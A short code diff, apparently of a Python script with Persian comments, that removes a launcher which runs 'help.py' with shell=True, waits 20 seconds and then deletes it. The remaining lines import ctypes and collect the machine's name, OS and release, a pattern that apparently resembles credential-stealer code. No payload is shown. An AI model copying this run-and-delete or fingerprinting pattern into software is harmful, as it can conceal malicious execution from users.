@@ -1,35 +1,3 @@
-import os
-import time
-import subprocess
-
-def main():
-    file_name = "help.py"
-    
-    # بررسی وجود فایل قبل از باز کردن
-    if os.path.exists(file_name):
-        try:
-            subprocess.Popen(["python", file_name], shell=True)
-        except FileNotFoundError:
-            print(f"File '{file_name}' not found.")
-            pass
-        
-        time_to_wait = 20
-        print(f"Waiting for {time_to_wait} seconds...")
-        time.sleep(time_to_wait)
-
-        # حذف فایل
-        try:
-            os.remove(file_name)
-            print(f"File '{file_name}' has been deleted.")
-        except FileNotFoundError:
-            print(f"File '{file_name}' not found for deletion.")
-    else:
-        print(f"File '{file_name}' does not exist. Skipping execution.")
-
-if __name__ == "__main__":
-    main()
-
-
 
 import ctypes
 from platform import node, system, release; Node, System, Release = node(), system(), release() 
